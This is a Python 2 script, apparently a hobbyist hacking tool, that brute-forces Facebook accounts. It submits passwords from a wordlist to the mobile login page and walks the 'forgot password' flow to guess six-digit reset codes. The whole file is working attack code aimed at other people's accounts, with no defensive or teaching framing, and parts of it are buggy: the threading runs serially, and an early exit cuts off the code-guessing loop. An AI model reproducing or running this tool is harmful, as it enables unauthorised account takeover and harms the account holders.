#!/usr/bin/env python2
import os
from browser import Browser
import argparse
from colorama import *
import threading


parser = argparse.ArgumentParser()
parser.add_argument('-u', metavar="user_id", type=str, nargs="?")
parser.add_argument('-p', metavar="pass_dir", type=str, nargs="?")
args = parser.parse_args()

url = "https://m.facebook.com"


def login_bruteforce(username, wordlist):
    browser = Browser()
    for password in wordlist:
        try:
            password = password.strip("\n")
            browser.open(url)
            response = browser.submit_form(form={'email': username, 'pass': password})
            verificatiion = "/save-device/" in response
            print(Fore.RED + "{0} => {1}: {2}".format(password, verificatiion, response) + Fore.WHITE)
            if verificatiion:
                print(Fore.GREEN + "{0} => {1}".format(password, verificatiion) + Fore.WHITE)
                exit()
        except KeyboardInterrupt:
            print("Exit Programme !")
            exit()


def dived(wordlist):
    newpassword = []
    if os.path.exists(wordlist):
        with open(str(wordlist), "r") as wordlist_file:
            list_of_password = wordlist_file.readlines()
            ndiv = len(list_of_password) // 100
            backup = []
            i = 0
            for pwd in list_of_password:
                backup.append(pwd)
                i += 1
                if i == ndiv:
                    newpassword.append(backup)
                    # reset variable
                    backup = []
                    i = 0
    return newpassword


def forgot_password_bruteforce(username, n_list):
    browser = Browser()
    try:
        # forgot password
        browser.open(url)
        forgot_password_link = browser.get_link_by_id('forgot-password-link')
        browser.open(forgot_password_link.base_url + forgot_password_link.url)

        # search account
        # browser.select_form(nr=0)
        # browser.form['email'] = username
        # browser.submit()
        browser.submit_form(form={'email': username})

        # use another way
        another_way_link = browser.get_link_by_text("Essayer")
        if another_way_link is not None:
            browser.open(another_way_link.base_url + another_way_link.url)

        # submit
        browser.select_form(nr=0)
        browser.submit()

        exit()

        c = 0
        for i in range(999999):
            code = str(i)
            left = 6 - len(code)
            for _ in range(left):
                code = "0" + code
            browser.submit_form(form={'n': code})
            if c == 3:
                break
            c += 1
        print browser.response().read()

    except KeyboardInterrupt:
        exit()


def hydra(username, wordlist):
    the_wordlist = dived(wordlist)
    [threading.Thread(login_bruteforce(username, wordlist_)).start() for wordlist_ in the_wordlist]


if __name__ == "__main__":
    # hydra(args.u, args.p)
    forgot_password_bruteforce(args.u, args.p)

